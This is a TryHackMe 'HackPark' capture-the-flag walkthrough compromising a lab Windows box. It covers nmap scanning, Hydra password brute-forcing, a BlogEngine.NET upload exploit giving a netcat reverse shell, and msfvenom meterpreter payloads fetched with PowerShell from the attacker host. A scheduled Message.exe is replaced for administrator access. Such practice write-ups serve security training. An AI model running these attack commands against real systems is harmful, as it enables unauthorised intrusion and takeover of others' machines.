| [![HackPark](/_static/images/it.png)](https://tryhackme.com/room/hackpark) |
|:--:|
| [https://tryhackme.com/room/hackpark](https://tryhackme.com/room/hackpark) |

# HackPark

SQLMap, crack some passwords, reveal services using a reverse SSH tunnel and escalate privileges to root.

## Scanning

First run a simple port scan (without Ping)

	nmap -Pn -p- <IP address target machine> -oN portscan

portscan:

    # Nmap 7.92 scan initiated Fri Sep 30 01:06:47 2022 as: nmap -Pn -p- -oN portscan 10.10.104.183
    Nmap scan report for 10.10.104.183
    Host is up (0.039s latency).
    Not shown: 65533 filtered tcp ports (no-response)
    PORT     STATE SERVICE
    80/tcp   open  http
    3389/tcp open  ms-wbt-server
    
    # Nmap done at Fri Sep 30 01:08:46 2022 -- 1 IP address (1 host up) scanned in 119.37 seconds

Run an `-A` scan on the open ports:

	nmap -Pn -T4 -A -p80,3389 <IP address target machine> -oN servicescan

servicescan:

    # Nmap 7.92 scan initiated Fri Sep 30 01:12:20 2022 as: nmap -Pn -T4 -A -p80,3389 -oN servicescan 10.10.104.183
    Nmap scan report for 10.10.104.183
    Host is up (0.039s latency).
    
    PORT     STATE SERVICE            VERSION
    80/tcp   open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
    |_http-server-header: Microsoft-IIS/8.5
    |_http-title: hackpark | hackpark amusements
    | http-methods: 
    |_  Potentially risky methods: TRACE
    | http-robots.txt: 6 disallowed entries 
    | /Account/*.* /search /search.aspx /error404.aspx 
    |_/archive /archive.aspx
    3389/tcp open  ssl/ms-wbt-server?
    | rdp-ntlm-info: 
    |   Target_Name: HACKPARK
    |   NetBIOS_Domain_Name: HACKPARK
    |   NetBIOS_Computer_Name: HACKPARK
    |   DNS_Domain_Name: hackpark
    |   DNS_Computer_Name: hackpark
    |   Product_Version: 6.3.9600
    |_  System_Time: 2022-09-30T00:13:35+00:00
    | ssl-cert: Subject: commonName=hackpark
    | Not valid before: 2022-09-29T00:05:48
    |_Not valid after:  2023-03-31T00:05:48
    |_ssl-date: 2022-09-30T00:13:36+00:00; 0s from scanner time.
    Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
    Device type: general purpose
    Running (JUST GUESSING): Microsoft Windows 2012 (89%)
    OS CPE: cpe:/o:microsoft:windows_server_2012
    Aggressive OS guesses: Microsoft Windows Server 2012 (89%), Microsoft Windows Server 2012 or Windows Server 2012 R2 (89%), Microsoft Windows Server 2012 R2 (89%)
    No exact OS matches for host (test conditions non-ideal).
    Network Distance: 2 hops
    Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
    
    TRACEROUTE (using port 80/tcp)
    HOP RTT      ADDRESS
    1   40.18 ms 10.9.0.1
    2   40.14 ms 10.10.104.183
    
    OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    # Nmap done at Fri Sep 30 01:13:36 2022 -- 1 IP address (1 host up) scanned in 76.02 seconds

There is a web server running on port 80/tcp.

## Exploring

A short exploration of the site gave me a username and a login page. 

| ![Welcome to hackpark](/_static/images/screenshot-hackpark.png)
|:--:|
| Welcome page clues |

A [reverse image search](https://www.reverseimagesearch.com/) gave the name of the clown.
The source code of the main page reveals an `Administrator` user `admin`. But we already knew that.

## Brute-force admin

Identify what type of request the form is making to the webserver by going to the login page.

Copy the URL:

    http://<IP address target machine>/Account/login.aspx?ReturnURL=/admin/

Type of request:

    # curl -s http://<IP address target machine>/Account/login.aspx?ReturnURL=/admin/ | grep "<form"
        <form method="post" action="login.aspx?ReturnURL=%2fadmin%2f" id="Form1">

Using Burpsuite Intruder, try a brute-force on that `admin` user. Fire up Burpsuite, go to login page, 
set Burpsuite to intercept, and try to log in. Catch the `__VIEWSTATE` for use in Hydra.

|                                                                                                                                                                                                                                                               ![Burpsuite proxy intercept](/_static/images/screenshot-intercept.png)                                                                                                                                                                                                                                                               |
|:-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------:|
| __VIEWSTATE=HyDAVJBUzaoWbePyeU7aJWUKLoIeSNhkpLwoKuSJYYorT2mFK5gG3zW4y%2F<br/>aa0Nv60arFkTV0uFNS8cU8Zrhf3QFwm4LeDyJVKQOfqh0GHwiKFm0NU%2BBa<br/>hqGt9szkQqO6inS92zNkiQ2x6usDxT9Zumz3go6vwo3AfOWIfRNuJeYa%2FsbQ&<br/>__EVENTVALIDATION=lSQI5ypG9I3szy4G87w98h3YF4IR%2FNhNTjz1YjdKlGwjW<br/>uzNrGbLTR%2Bm%2FHYM84xxxticrZc8pgZrywRT5QrN2kYdTOWNlu0Iw%2FUYZcl<br/>fGLWghmvGeRx4rfh5oYC8QbeVh60uXYY0FpdFSJGJY4D56nvCYUwXjUfl4QlydaPXqAKiNcb9<br/>&ctl00%24MainContent%24LoginUser%24UserName=admin&ctl00%24MainContent<br/>%24LoginUser%24Password=admin&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in |


Mini hydra cheatsheet:

| Command                                                                                                                                                | Description                                                                                                                                                                       |
|:-------------------------------------------------------------------------------------------------------------------------------------------------------|:----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|
| hydra -P <wordlist> -v <ip> <protocol>                                                                                                                 | Brute force against a protocol of your choice.                                                                                                                                    |
| hydra -v -V -u -L <username list> -P <password list> -t 1 -u <ip> <protocol>                                                                           | You can use Hydra to bruteforce usernames as well <br/>as passwords. It will loop through every combination <br/>in your lists. (-vV = verbose mode, showing login <br/>attempts) |
| hydra -t 1 -V -f -l <username> -P <wordlist> rdp://<ip>                                                                                                | Attack a Windows Remote Desktop with a password <br/>list.                                                                                                                        |
| hydra -l <username> -P .<password list> $ip -V http-form-post '/wp-login.php:<br/>log=^USER^&pwd=^PASS^&wp-submit=<br/>Log In&testcookie=1:S=Location' | Craft a more specific request for Hydra <br/>to brute force.                                                                                                                      |

Constructing the hydra command:

* `-f` flag to stop the attack when a valid password is found
* `-l` flag to specify the username for the bruteforce attack = `admin`
* `-P` flag to specify the wordlist to use for the bruteforce = `/usr/share/wordlists/rockyou.txt`
* IP of the target server = `10.10.39.227`
* Type of attack = `http-post-form`
* Page to attack = "`/Account/login.aspx:__VIEWSTATE...`"
* In `__VIEWSTATE...` change `UserName=admin` to `UserName=^USER^`
* In `__VIEWSTATE...` change `Password=admin` to `Password=^PASS^`
* Add a Failed login message to be able to detect when we have success = `:Login Failed`

```text
# hydra -f -l admin -P /usr/share/wordlists/rockyou.txt 10.10.39.227 http-post-form "/Account/login.aspx:__VIEWSTATE=HyDAVJBUzaoWbePyeU7aJWUKLoIeSNhkpLwoKuSJYYorT2mFK5gG3zW4y%2Faa0Nv60arFkTV0uFNS8cU8Zrhf3QFwm4LeDyJVKQOfqh0GHwiKFm0NU%2BBahqGt9szkQqO6inS92zNkiQ2x6usDxT9Zumz3go6vwo3AfOWIfRNuJeYa%2FsbQ&__EVENTVALIDATION=lSQI5ypG9I3szy4G87w98h3YF4IR%2FNhNTjz1YjdKlGwjWuzNrGbLTR%2Bm%2FHYM84xxxticrZc8pgZrywRT5QrN2kYdTOWNlu0Iw%2FUYZclfGLWghmvGeRx4rfh5oYC8QbeVh60uXYY0FpdFSJGJY4D56nvCYUwXjUfl4QlydaPXqAKiNcb9&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login Failed"
```

Results:

```text
Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organs, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-09-30 05:11:49
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking http-post-form://10.10.39.227:80/Account/login.aspx:__VIEWSTATE=HyDAVJBUzaoWbePyeU7aJWUKLoIeSNhkpLwoKuSJYYorT2mFK5gG3zW4y%2Faa0Nv60arFkTV0uFNS8cU8Zrhf3QFwm4LeDyJVKQOfqh0GHwiKFm0NU%2BBahqGt9szkQqO6inS92zNkiQ2x6usDxT9Zumz3go6vwo3AfOWIfRNuJeYa%2FsbQ&__EVENTVALIDATION=lSQI5ypG9I3szy4G87w98h3YF4IR%2FNhNTjz1YjdKlGwjWuzNrGbLTR%2Bm%2FHYM84xxxticrZc8pgZrywRT5QrN2kYdTOWNlu0Iw%2FUYZclfGLWghmvGeRx4rfh5oYC8QbeVh60uXYY0FpdFSJGJY4D56nvCYUwXjUfl4QlydaPXqAKiNcb9&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login Failed
[80][http-post-form] host: 10.10.39.227   login: admin   password: 1qaz2wsx
[STATUS] attack finished for 10.10.39.227 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-09-30 05:12:42
```

## Compromise the machine 

Logged in as admin, click on the "About" link from the menu.

| ![About](/_static/images/about.png)
|:--:|
| About page with version information |

    # searchsploit blogengine 3.3.6
    ------------------------------------------------------------------------------- ---------------------------------
     Exploit Title                                                                 |  Path
    ------------------------------------------------------------------------------- ---------------------------------
    BlogEngine.NET 3.3.6 - Directory Traversal / Remote Code Execution             | aspx/webapps/46353.cs
    BlogEngine.NET 3.3.6/3.3.7 - 'dirPath' Directory Traversal / Remote Code Execu | aspx/webapps/47010.py
    BlogEngine.NET 3.3.6/3.3.7 - 'path' Directory Traversal                        | aspx/webapps/47035.py
    BlogEngine.NET 3.3.6/3.3.7 - 'theme Cookie' Directory Traversal / Remote Code  | aspx/webapps/47011.py
    BlogEngine.NET 3.3.6/3.3.7 - XML External Entity Injection                     | aspx/webapps/47014.py
    ------------------------------------------------------------------------------- ---------------------------------
    Shellcodes: No Results
    Papers: No Results

More on that:

    # searchsploit -m aspx/webapps/46353.cs
      Exploit: BlogEngine.NET 3.3.6 - Directory Traversal / Remote Code Execution
          URL: https://www.exploit-db.com/exploits/46353
         Path: /usr/share/exploitdb/exploits/aspx/webapps/46353.cs
    File Type: HTML document, ASCII text
    
    Copied to: /home/nina/Downloads/46353.cs

Get the CVE:
                                                                                                                 
    # grep CVE 46353.cs
    # CVE : CVE-2019-6714

With possible exploit [BlogEngine.NET 3.3.6 - Directory Traversal / Remote Code Execution](https://www.exploit-db.com/exploits/46353)

1. Download and modify the IP and port values in the script.

| ![Exploit script](/_static/images/screenshot-46353.png)
|:--:|
| Change IP address to the IP address of the attack machine, and port to listening port (4442) |

2. Save and rename script to `PostView.ascx`
3. Go to posts (`http://IP address target machine/admin/#/content/posts`) and click on "Welcome to HackPark" to edit it.

| ![Edit button](/_static/images/screenshot-edit.png)
|:--:|
| There it is |

4. On the edit bar on top of the post, click on the "File Manager" icon.

| ![File manager button](/_static/images/screenshot-file-manager.png)
|:--:|
| Not easy to find |

5. Click on the "+ UPLOAD" button and upload the `PostView.ascx` script
6. Close the file manager and click on "Save"
7. Start a listener with the port as entered in the script

```text
# rlwrap nc -nlvp 4442
```

8. Go to `http://IP address target machine/?theme=../../App_Data/files`

```text
whoami
c:\windows\system32\inetsrv>whoami
iis apppool\blog
```

## Privilege escalation

Pivot from netcat to a meterpreter session, and enumerate the machine to identify potential vulnerabilities. Then use 
this gathered information to exploit the system and become Administrator. 

```text
# msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=<IP address attack machine> LPORT=5555 -f exe -o revshell.exe
```

In the directory where the `revshell.exe` is, start a web server:

    # python3 -m http.server 8000

In the reverse shell we already have:

    powershell -c "Invoke-WebRequest -Uri 'http://IP address attack machine:8000/revshell.exe' -OutFile 'c:\windows\temp\revshell.exe'"

In a new terminal, set up a Metasploit multi-handler:

```text
# msfconsole -q
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set PAYLOAD windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST <IP address attack machine>
msf6 exploit(multi/handler) > set LPORT 5555
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on <IP address attack machine>:5555 
```

In the reverse shell terminal, start the executable: 

```text
C:\windows\system32\inetsrv>cd \windows\temp
c:\Windows\Temp>.\revshell.exe
```

In the `msfconsole` terminal, a `meterpreter` shell has appeared:

```text
meterpreter > 
```

Get detailed information about the Windows system:

```text
meterpreter > sysinfo
Computer        : HACKPARK
OS              : Windows 2012 R2 (6.3 Build 9600).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 1
Meterpreter     : x86/windows
```

Processes:

```text
meterpreter > ps

Process List
============

 PID   PPID  Name                  Arch  Session  User              Path
 ---   ----  ----                  ----  -------  ----              ----
 0     0     [System Process]
 4     0     System
 68    676   svchost.exe
 352   676   svchost.exe
 368   4     smss.exe
 524   516   csrss.exe
 576   568   csrss.exe
 584   516   wininit.exe
 612   568   winlogon.exe
 676   584   services.exe
 684   584   lsass.exe
 748   676   svchost.exe
 792   676   svchost.exe
 832   1404  revshell.exe          x86   0        IIS APPPOOL\Blog  c:\Windows\Temp\revshell.exe
 876   612   dwm.exe
 884   676   svchost.exe
 912   676   svchost.exe
 964   676   svchost.exe
 1148  676   spoolsv.exe
 1176  676   amazon-ssm-agent.exe
 1252  676   svchost.exe
 1284  676   LiteAgent.exe
 1356  676   svchost.exe
 1372  676   svchost.exe
 1404  2952  cmd.exe               x64   0        IIS APPPOOL\Blog  C:\Windows\System32\cmd.exe
 1432  676   WService.exe
 1560  1432  WScheduler.exe
 1652  676   Ec2Config.exe
 1784  748   WmiPrvSE.exe
 2028  676   svchost.exe
 2300  2388  Message.exe
 2340  1404  conhost.exe           x64   0        IIS APPPOOL\Blog  C:\Windows\System32\conhost.exe
 2388  3068  WScheduler.exe
 2488  912   taskhostex.exe
 2564  2556  explorer.exe
 2600  676   msdtc.exe
 2952  1372  w3wp.exe              x64   0        IIS APPPOOL\Blog  C:\Windows\System32\inetsrv\w3wp.exe
 3016  2516  ServerManager.exe
```

Program files:

```text
meterpreter > cd "c:\program files (x86)"
meterpreter > ls
Listing: c:\program files (x86)
===============================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
040777/rwxrwxrwx  0     dir   2013-08-22 16:39:30 +0100  Common Files
040777/rwxrwxrwx  4096  dir   2014-03-21 19:07:01 +0000  Internet Explorer
040777/rwxrwxrwx  0     dir   2013-08-22 16:39:30 +0100  Microsoft.NET
040777/rwxrwxrwx  8192  dir   2019-08-04 12:37:02 +0100  SystemScheduler
040777/rwxrwxrwx  0     dir   2019-08-06 22:12:04 +0100  Uninstall Information
040777/rwxrwxrwx  0     dir   2013-08-22 16:39:33 +0100  Windows Mail
040777/rwxrwxrwx  0     dir   2013-08-22 16:39:30 +0100  Windows NT
040777/rwxrwxrwx  0     dir   2013-08-22 16:39:30 +0100  WindowsPowerShell
100666/rw-rw-rw-  174   fil   2013-08-22 16:37:57 +0100  desktop.ini
```

Ah. SystemScheduler:

```text
meterpreter > cd SystemScheduler
meterpreter > ls
Listing: c:\program files (x86)\SystemScheduler
===============================================

Mode              Size     Type  Last modified              Name
----              ----     ----  -------------              ----
040777/rwxrwxrwx  4096     dir   2022-09-30 19:49:34 +0100  Events
100666/rw-rw-rw-  60       fil   2019-08-04 12:36:42 +0100  Forum.url
100666/rw-rw-rw-  9813     fil   2004-11-16 07:16:34 +0000  License.txt
100666/rw-rw-rw-  1496     fil   2022-09-30 18:48:54 +0100  LogFile.txt
100666/rw-rw-rw-  3760     fil   2022-09-30 18:49:25 +0100  LogfileAdvanced.txt
100777/rwxrwxrwx  536992   fil   2018-03-25 18:58:56 +0100  Message.exe
100777/rwxrwxrwx  445344   fil   2018-03-25 18:59:00 +0100  PlaySound.exe
100777/rwxrwxrwx  27040    fil   2018-03-25 18:58:58 +0100  PlayWAV.exe
100666/rw-rw-rw-  149      fil   2019-08-04 23:05:19 +0100  Preferences.ini
100777/rwxrwxrwx  485792   fil   2018-03-25 18:58:58 +0100  Privilege.exe
100666/rw-rw-rw-  10100    fil   2018-03-24 19:09:04 +0000  ReadMe.txt
100777/rwxrwxrwx  112544   fil   2018-03-25 18:58:58 +0100  RunNow.exe
100777/rwxrwxrwx  235936   fil   2018-03-25 18:58:56 +0100  SSAdmin.exe
100777/rwxrwxrwx  731552   fil   2018-03-25 18:58:56 +0100  SSCmd.exe
100777/rwxrwxrwx  456608   fil   2018-03-25 18:58:58 +0100  SSMail.exe
100777/rwxrwxrwx  1633696  fil   2018-03-25 18:58:52 +0100  Scheduler.exe
100777/rwxrwxrwx  491936   fil   2018-03-25 18:59:00 +0100  SendKeysHelper.exe
100777/rwxrwxrwx  437664   fil   2018-03-25 18:58:56 +0100  ShowXY.exe
100777/rwxrwxrwx  439712   fil   2018-03-25 18:58:56 +0100  ShutdownGUI.exe
100666/rw-rw-rw-  785042   fil   2006-05-17 00:49:52 +0100  WSCHEDULER.CHM
100666/rw-rw-rw-  703081   fil   2006-05-17 00:58:18 +0100  WSCHEDULER.HLP
100777/rwxrwxrwx  136096   fil   2018-03-25 18:58:58 +0100  WSCtrl.exe
100777/rwxrwxrwx  68512    fil   2018-03-25 18:58:54 +0100  WSLogon.exe
100666/rw-rw-rw-  33184    fil   2018-03-25 18:59:00 +0100  WSProc.dll
100666/rw-rw-rw-  2026     fil   2006-05-16 23:58:18 +0100  WScheduler.cnt
100777/rwxrwxrwx  331168   fil   2018-03-25 18:58:52 +0100  WScheduler.exe
100777/rwxrwxrwx  98720    fil   2018-03-25 18:58:54 +0100  WService.exe
100666/rw-rw-rw-  54       fil   2019-08-04 12:36:42 +0100  Website.url
100777/rwxrwxrwx  76704    fil   2018-03-25 18:58:58 +0100  WhoAmI.exe
100666/rw-rw-rw-  1150     fil   2007-05-17 21:47:02 +0100  alarmclock.ico
100666/rw-rw-rw-  766      fil   2003-08-31 20:06:08 +0100  clock.ico
100666/rw-rw-rw-  80856    fil   2003-08-31 20:06:10 +0100  ding.wav
100666/rw-rw-rw-  1637972  fil   2009-01-09 03:21:48 +0000  libeay32.dll
100777/rwxrwxrwx  40352    fil   2018-03-25 18:59:00 +0100  sc32.exe
100666/rw-rw-rw-  766      fil   2003-08-31 20:06:26 +0100  schedule.ico
100666/rw-rw-rw-  355446   fil   2009-01-09 03:12:34 +0000  ssleay32.dll
100666/rw-rw-rw-  6999     fil   2019-08-04 12:36:42 +0100  unins000.dat
100777/rwxrwxrwx  722597   fil   2019-08-04 12:36:32 +0100  unins000.exe
100666/rw-rw-rw-  6574     fil   2009-06-27 01:27:32 +0100  whiteclock.ico
```

Events:

```text
meterpreter > cd events
meterpreter > ls
Listing: c:\program files (x86)\SystemScheduler\events
======================================================

Mode              Size   Type  Last modified              Name
----              ----   ----  -------------              ----
100666/rw-rw-rw-  1926   fil   2022-09-30 19:50:01 +0100  20198415519.INI
100666/rw-rw-rw-  26066  fil   2022-09-30 19:50:01 +0100  20198415519.INI_LOG.txt
100666/rw-rw-rw-  290    fil   2020-10-02 22:50:12 +0100  2020102145012.INI
100666/rw-rw-rw-  186    fil   2022-09-30 19:40:50 +0100  Administrator.flg
100666/rw-rw-rw-  182    fil   2022-09-30 19:40:48 +0100  SYSTEM_svc.flg
100666/rw-rw-rw-  0      fil   2022-09-30 18:49:25 +0100  Scheduler.flg
100666/rw-rw-rw-  449    fil   2022-09-30 19:40:50 +0100  SessionInfo.flg
100666/rw-rw-rw-  57     fil   2022-09-30 19:50:32 +0100  Update.flg
100666/rw-rw-rw-  0      fil   2022-09-30 19:41:10 +0100  service.flg

meterpreter >
```

We have an executable called `Message.exe` being executed (every 30 minutes) by administrator in a directory that has 
Everyone `WriteData/CreateFiles` permissions. Replace `C:\Program Files (x86)\SystemScheduler\Message.exe` with a reverse shell.

Create the payload:

```text
msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=<IP address attack machine> LPORT=6666 -f exe -o Message.exe
```

In the directory with the exploit, start a http server:

    # python3 -m http.server 8080

In Metasploit, set up a multi-handler:

```text
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set PAYLOAD windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST <IP address attack machine>
msf6 exploit(multi/handler) > set LPORT 6666
msf6 exploit(multi/handler) > run
```

In the existing reverse shell terminal, download the new reverse shell and replace the existing `Message.exe`:

    powershell -c "Invoke-WebRequest -Uri 'http://IP address attack machine:8080/Message.exe' -OutFile 'C:\Program Files (x86)\SystemScheduler\Message.exe'"

## User flag

```text
meterpreter > getuid 
Server username: HACKPARK\Administrator
meterpreter > cd c:\users\jeff\desktop\
meterpreter > cat user.txt 
```

## Root flag

```text
meterpreter > cd C:\users\administrator\desktop
meterpreter > cat root.txt
```

## Privilege escalation without Metasploit 

Get WinPEAS:

    # wget https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/winPEAS/winPEASexe/winPEAS/bin/x64/Release/winPEAS.exe

Start a http server:

    # python -m http.server 8888

In the meterpreter shell, drop into a normal cmd shell, cd in to the Temp folder which is writeable by everyone, 
then use PowerShell to pull winPEAS over:

    meterpreter > shell
    C:\Windows\Temp> powershell -c "Invoke-WebRequest -Uri 'http://<IP address target>:8888/WinPEAS.exe' -OutFile 'c:\windows\temp\winpeas.exe'"
    C:\Windows\Temp> winpeas.exe

A lot of output. The Services Information section:

```text
  ========================================(Services Information)========================================
  [+] Interesting Services -non Microsoft-
   [?] Check if you can overwrite some service binary or perform a DLL hijacking, also check for unquoted paths https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#services
    Amazon EC2Launch(Amazon Web Services, Inc. - Amazon EC2Launch)["C:\Program Files\Amazon\EC2Launch\EC2Launch.exe" service] - Auto - Stopped
    Amazon EC2Launch
   =================================================================================================
    AmazonSSMAgent(Amazon SSM Agent)["C:\Program Files\Amazon\SSM\amazon-ssm-agent.exe"] - Auto - Running
    Amazon SSM Agent
   =================================================================================================
    AWSLiteAgent(Amazon Inc. - AWS Lite Guest Agent)[C:\Program Files\Amazon\XenTools\LiteAgent.exe] - Auto - Running - No quotes and Space detected
    AWS Lite Guest Agent
   =================================================================================================
    Ec2Config(Amazon Web Services, Inc. - Ec2Config)["C:\Program Files\Amazon\Ec2ConfigService\Ec2Config.exe"] - Auto - Running - isDotNet
    Ec2 Configuration Service
   =================================================================================================
    PsShutdownSvc(Systems Internals - PsShutdown)[C:\Windows\PSSDNSVC.EXE] - Manual - Stopped
   =================================================================================================
    WindowsScheduler(Splinterware Software Solutions - System Scheduler Service)[C:\PROGRA~2\SYSTEM~1\WService.exe] - Auto - Running
    File Permissions: Everyone [WriteData/CreateFiles]
    Possible DLL Hijacking in binary folder: C:\Program Files (x86)\SystemScheduler (Everyone [WriteData/CreateFiles])
    System Scheduler Service Wrapper
   =================================================================================================
```

The last one indicates a possible DLL hijack. On Exploit-DB: 
[Splinterware System Scheduler Pro 5.12 - Privilege Escalation](https://www.exploit-db.com/exploits/45072)